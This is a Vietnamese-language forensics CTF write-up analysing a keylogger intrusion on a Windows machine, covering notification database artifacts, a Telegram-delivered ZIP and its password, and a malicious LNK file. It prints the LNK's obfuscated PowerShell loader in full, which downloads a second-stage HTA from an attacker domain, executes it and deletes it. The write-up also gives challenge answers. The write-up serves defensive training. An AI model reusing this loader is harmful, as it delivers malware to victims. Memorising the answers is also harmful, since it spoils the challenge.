# Writeup Kraken - Keylogger 

### Description: Analyze Windows 10 notification artifacts, installed applications, LNK files, and Applications logs to uncover malicious activity and enhance forensic investigation capabilities.
Artifact we have is the file system Windows, but it haven't had Journaling, prefetch, MFT, recyle bin, database chrome,... We need to use this artifact reconstruct all chain attack of attacker to known how victim be attacking and technique of threat actor use

### Technical skill

Initial access
Persistence
Artifact Windows
LOL APPS Research tools
C2 server & Exfiltration
Priviledge Escalation


Solving & Solution

Task 1: What is the the web messaging app the employee used to talk to the attacker?

Đầu tiên khi có được artifact là file system, và app message có liên quan đến web app, thì mình thực hiện check vào database history xem có lưu lại lịch sử web nào mà victim từng truy cập vào.

-> Database history của edge -> không có gì
-> Database của chrome -> không có history database

```xml
<toast launch="0|0|Default|0|https://web.telegram.org/|p#https://web.telegram.org/#" displayTimestamp="2023-07-11T16:57:15Z">
 <visual>
  <binding template="ToastGeneric">
   <text>Nawaf</text>
   <text>📎 our project templet test.zip,pass:@1122d</text>
   <text placement="attribution">web.telegram.org</text>
   <image placement="appLogoOverride" src="C:\Users\OMEN\AppData\Local\Google\Chrome\User Data\Notification Resources\cd18935b-57e3-4838-b5e3-ef360362f771.tmp" hint-crop="none"/>
  </binding>
 </visual>
 <actions>
  <action content="Go to Chrome notification settings" placement="contextMenu" activationType="foreground" arguments="2|0|Default|0|https://web.telegram.org/|p#https://web.telegram.org/#"/>
 </actions>
</toast>
```

Research them thì có 1 artifact database trong windows có lưu lại những website mà người dung có truy cập tới nằm trong folder "C:\Users\OMEN\AppData\Roaming\Microsoft\Windows\Notifcations\wpndatabase.db" 

> Ở đây artifact `Notification` này là một dịch vụ của windows, nó dung để push & send các notification của các ứng dung đến với screen của user. Thì thông thường nó sẽ có 3 dạng thông báo
> - `Badge`: dạng thông báo số tin nhắn hiện trên icon của ứng dụng
> - `Tile`: là 1 ô nhỏ hình chữ nhập hiển thị trên màn hình liên kết với ứng dung.
> - `Toast`: Dạng thông báo hiện ở góc phải màn hình rồi tắt trong khoảng 5s.

Dựa vào artifact này nó sẽ có một file database dùng để lưu các thông báo đã từng được hiển thị trên máy victim nằm chính trong file `C:\Users\OMEN\AppData\Roaming\Microsoft\Windows\Notifcations\wpndatabase.db`.

-> Dựa vào đây check dần sẽ ra application được sử dung là telegram.


Task 2: What is the password for the protected ZIP file sent by the attacker to the employee?


-> Tiếp tục dựa vào cái entry đấy trong database sẽ tìm được thêm cả password: `<text>📎 our project templet test.zip,pass:@1122d</text>`

Task 3: What domain did the attacker use to download the second stage of the malware?

Từ stage1 mình biết được attacker đã gửi cho victim 1 file zip, và bên trong đó có 1 file docx, liên hệ với evidence này thì mình tiếp tục dò tiếp trong các folder `Document, Download, Desktop` của user:

<img width="1914" height="621" alt="image" src="https://github.com/user-attachments/assets/2ba858d6-cf20-4ef5-8c90-3f45c7330679" />

Ở đây ngoài file `.docx` thì bên trong folder của file `.zip` nó còn có thêm 1 file `templet.lnk`, nhưng khi mình xem qua trước phần hex dump của file `lnk` này thì thấy nó khá sú =))):

```powershell
powershell.exe9-ExecutionPolicy UnRestricted $ProgressPreference = 0;
function nvRClWiAJT($OnUPXhNfGyEh)
{$OnUPXhNfGyEh[$OnUPXhNfGyEh.Length..0] -join('')};
function sDjLksFILdkrdR($OnUPXhNfGyEh){
$vecsWHuXBHu = nvRClWiAJT $OnUPXhNfGyEh;
for($TJuYrHOorcZu = 0;$TJuYrHOorcZu -lt $vecsWHuXBHu.Length;$TJuYrHOorcZu += 2){
try{$zRavFAQNJqOVxb += nvRClWiAJT $vecsWHuXBHu.Substring($TJuYrHOorcZu,2)}
catch{$zRavFAQNJqOVxb += $vecsWHuXBHu.Substring($TJuYrHOorcZu,1)}};$zRavFAQNJqOVxb};
$NpzibtULgyi = sDjLksFILdkrdR 'aht1.sen/hi/coucys.erstmaofershma//s:tpht';
$cDkdhkGBtl = $env:APPDATA + '\' + ($NpzibtULgyi -split '/')[-1];
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
$wbpiCTsGYi = wget $NpzibtULgyi -UseBasicParsing;
[IO.File]::WriteAllText($cDkdhkGBtl, $wbpiCTsGYi);
& $cDkdhkGBtl;
sleep 3;
rm $cDkdhkGBtl; C:\Windows\System32\imageres.dll�%SystemRoot%\System32\imageres.dll%SystemRoot%\System32\imageres.dll
```

File `lnk` này được dùng trực tiếp để gọi tới process powershell -> Sau đó thực hiện chạy block script đã obfuscated bên dưới, logic của script này mình phân tích theo từng hàm:

```python
function nvRClWiAJT($OnUPXhNfGyEh)
{$OnUPXhNfGyEh[$OnUPXhNfGyEh.Length..0] -join('')};
```
> Hàm này thực hiện ghép các phần tử thành 1 chuỗi

```python
function sDjLksFILdkrdR($OnUPXhNfGyEh){
$vecsWHuXBHu = nvRClWiAJT $OnUPXhNfGyEh;
for($TJuYrHOorcZu = 0;$TJuYrHOorcZu -lt $vecsWHuXBHu.Length;$TJuYrHOorcZu += 2){
try{$zRavFAQNJqOVxb += nvRClWiAJT $vecsWHuXBHu.Substring($TJuYrHOorcZu,2)}
catch{$zRavFAQNJqOVxb += $vecsWHuXBHu.Substring($TJuYrHOorcZu,1)}};$zRavFAQNJqOVxb};
$NpzibtULgyi = sDjLksFILdkrdR 'aht1.sen/hi/coucys.erstmaofershma//s:tpht';
$cDkdhkGBtl = $env:APPDATA + '\' + ($NpzibtULgyi -split '/')[-1];
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
$wbpiCTsGYi = wget $NpzibtULgyi -UseBasicParsing;
[IO.File]::WriteAllText($cDkdhkGBtl, $wbpiCTsGYi);
& $cDkdhkGBtl;
sleep 3;
```
> Hàm này sẽ theo logic sau:
> -> Nó thực hiện gọi tới chuỗi vừa được ghép
> -> Chuỗi cần được ghép lại là: `aht1.sen/hi/coucys.erstmaofershma//s:tpht`
> -> Tạo 1 vòng lặp duyệt qua mỗi 2 kí tự trong chuỗi, sau đó thực hiện nghịch đảo vị trí nó lại
> -> Reverse thay thế dấu `/` -> `\`, sau đó reverse lại toàn bộ chuỗi
> -> Dùng command wget để tải payload stage2 về.
> -> Ghi file vào bên trong thư mục `AppData\Roaming`.

Sau đó thực thi file được tải về -> sleep để evasion -> thực hiện xóa dấu vết bằng `rm`.

Mình viết 1 script nhỏ thực hiện đảo cặp kí tự trong chuỗi đã reverse:

```python
def swap_pairs(s):
  result = []
  for i in range(0, len(s), 2):
    pair = s[i : i + 2]
    result.append(pair[::-1])

  return "".join(result)

text = "thpt:s//amhsrefoamtsre.sycuoc/ih/nes.1tha"
new_text = swap_pairs(text)
print(f"Chuỗi ban đầu: {text}")
print(f"Sau khi đổi cặp: {new_text}")
```

-> Url: **https://masherofmasters.cyou/chin/se1.hta**, domain: **masherofmasters.cyou**.

**Task 4: What is the name of the command that the attacker injected using one of the installed LOLAPPS on the machine to achieve persistence?**
